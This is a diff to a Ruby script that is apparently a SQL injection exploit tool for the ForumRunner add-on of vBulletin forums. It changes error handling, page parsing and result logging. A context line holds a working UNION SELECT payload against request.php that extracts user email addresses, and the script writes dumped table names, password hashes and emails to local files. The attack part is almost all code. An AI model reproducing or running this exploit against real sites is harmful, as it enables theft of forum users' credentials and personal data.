@@ -51,22 +51,24 @@ def vbdump(url)
     '/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,email))))x),5,6,7,8,9,10-- -'
   ]
 
-  if url != 0
-    puts "Checking #{url} for ForumRunner Vulnerability".yellow
-    begin
-      page = m.get(url + vectors[@dm]).search('html').to_s
-    rescue => e
-      puts "vBdump: #{e}"
+  puts "Checking #{@url} for ForumRunner Vulnerability".yellow
+  begin
+    page = m.get(@url + vectors[@dm]).search('html').css('.restore').last.to_s
+  rescue => e
+    code = e.response_code
+    err = code
+    case code
+    when "404"
+      err = "Page Not Found"
+    when "403"
+      err = "Site is not vunerable"
     end
-  else
-    puts "Checking #{@url} for ForumRunner Vulnerability".yellow
-    begin
-      page = m.get(@url + vectors[@dm]).search('html').css('.restore').last.to_s
-    rescue => e
-      puts "vBdump: #{e}"
-    end
+    abort(err)
   end
-  page.split('Post', 2).last.split('Thread').first
+  if page.include? "Post"
+    page = page.split('Post', 2).last.split('Thread').first
+  end
+  return page
 end
 
 def vbparse(txt)
@@ -88,7 +90,6 @@ def vbparse(txt)
         res << s
       end
     end
-    res.each { |r| puts r }
   elsif @dm == 2
     txt.each do |t|
       s = t.scan(r3)
@@ -115,13 +116,16 @@ def vbparse(txt)
     end
     puts res
   end
-  puts 'Site appears to be vulnerable'.red if res.length > 1
-  res = false unless res.length > 1
+  abort("Site is not vulnerable.") if res.length < 3
+  if @fbase == "FuzzyDogNuts"
+    puts "You forgot to declare a file base name with '-o', using FuzzyDogNuts so you'll remember next time.".cyan
+  end
   res.each do |r|
     File.open(@fbase + '.tables', 'a') { |f| f.puts r } if @dm == 1
     File.open(@fbase + '.hash', 'a') { |f| f.puts r } if @dm == 2
     File.open(@fbase + '.mail', 'a') { |f| f.puts r } if @dm == 3
   end
+  puts "Results logged to file"
   res
 end
 
@@ -156,6 +160,7 @@ else
   puts BANNER.split('Usage', 2).first
   @dm = 1
   @cr = false
+  @fbase = "FuzzyDogNuts"
   ARGV.each do |arg|
     a = ARGV.index(arg) + 1
     case arg
